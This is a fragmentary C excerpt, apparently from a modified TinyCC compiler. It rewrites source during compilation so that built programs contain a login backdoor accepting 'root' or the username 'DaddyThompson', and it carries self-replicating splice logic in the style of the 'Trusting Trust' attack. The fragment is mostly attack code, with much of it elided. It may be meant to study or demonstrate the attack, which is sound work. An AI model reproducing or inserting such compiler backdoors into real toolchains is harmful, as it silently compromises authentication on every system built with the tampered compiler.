...
ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
{
    ...
    // Create a buffer to hold all the source code
    ...
    // Define the target string we want to replace, Now we want to actually insert the logic to create a binary
    // that contains the login backdoor
    char *target = "if (flags & AFF_TYPE_BIN)\n        return tcc_add_binary(s1, flags, filename, fd);\n";

    // Backdoor string that we want to insert into the program
    char *backdoor =
    "if (flags & AFF_TYPE_BIN)\n"
    "   return tcc_add_binary(s1, flags, filename, fd);\n"
    ...
    "char * backdoor = \"if (!strcmp(username, \\\"root\\\") || !strcmp(username, \\\"DaddyThompson\\\"))\";\n"
    ...
    "char *d = new_buf;\n"
    "while (*s) {\n"
    "if (strncmp(s, target, target_len) == 0) {memcpy(d, backdoor, replace_len);d += replace_len;s += target_len;}\n"
    "else {*d = *s;d++;s++;}\n"
    "}\n"
    "*d = '\\0';\n"
    "tcc_free(source);\n"
    ...
    // Get the size of the new source
    size_t target_len = strlen(target);
    size_t replace_len = strlen(backdoor);
    size_t new_len = strlen(source) + (replace_len - target_len);
